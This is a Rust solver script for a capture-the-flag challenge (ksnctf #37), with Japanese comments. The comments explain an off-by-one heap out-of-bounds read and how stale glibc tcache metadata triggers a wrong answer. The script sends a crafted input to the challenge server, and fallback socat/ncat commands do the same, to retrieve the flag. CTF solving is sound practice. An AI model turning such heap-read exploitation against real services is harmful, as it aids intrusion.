//! ksnctf #37 Competitive Programming — Rustによる解法
//!
//! 【バグの仕組み】
//! mirror.c のチェックループ:
//!   for (p=0; p<=n; p++)   // p==n まで回る → buf[n] を読む (OOB!)
//!       if (buf[p]!='\0') f = 0;
//!
//! malloc(n) は n バイトしか確保しないため buf[n] はヒープ外。
//! free() 後に同サイズで再 malloc() すると glibc tcache のメタデータが
//! buf[n] に残り 0 でない値になる → mirror なのに "no" と誤出力！
//!
//! 【ハック入力】
//! N=2, 両ケースとも n=1 A="a" B="a" (本当に mirror)
//! → 1回目: "mirror"  (正常)
//! → 2回目: "no"      (バグ！ tcache フラグが buf[1] に残っている)

use std::net::TcpStream;
use std::io::{Write, BufReader, BufRead};

fn main() {
    // 制約に合致する入力: n=1, A="a", B="a" は正真正銘 mirror
    // しかし2回目のケースではヒープのtcacheメタデータにより誤動作する
    let hack_input = b"2\n1 a a\n1 a a\n";

    println!("=== ksnctf #37 Competitive Programming Solver ===");
    println!("送信するハック入力:");
    println!("{}", std::str::from_utf8(hack_input).unwrap());
    println!("期待される誤った出力: mirror / no");
    println!("(正しい出力は mirror / mirror)");
    println!();

    let addr = "ctfq.u1tramarine.blue:10037";
    println!("接続先: {}", addr);

    match TcpStream::connect(addr) {
        Ok(mut stream) => {
            println!("接続成功！\n");
            stream.write_all(hack_input).unwrap();
            stream.shutdown(std::net::Shutdown::Write).unwrap();

            let reader = BufReader::new(&stream);
            let mut flag = String::new();

            for line in reader.lines() {
                match line {
                    Ok(l) => {
                        println!("{}", l);
                        if l.contains("FLAG_") {
                            flag = l.clone();
                        }
                    }
                    Err(_) => break,
                }
            }

            if !flag.is_empty() {
                println!("\n🎉 FLAG 取得: {}", flag);
            }
        }
        Err(e) => {
            eprintln!("接続エラー: {}", e);
            eprintln!("\n手動で実行する場合:");
            eprintln!("  echo '2\\n1 a a\\n1 a a' | socat - TCP:ctfq.u1tramarine.blue:10037");
            eprintln!("または:");
            eprintln!("  echo '2\\n1 a a\\n1 a a' | ncat --ssl ctfq.u1tramarine.blue 20037");
        }
    }
}
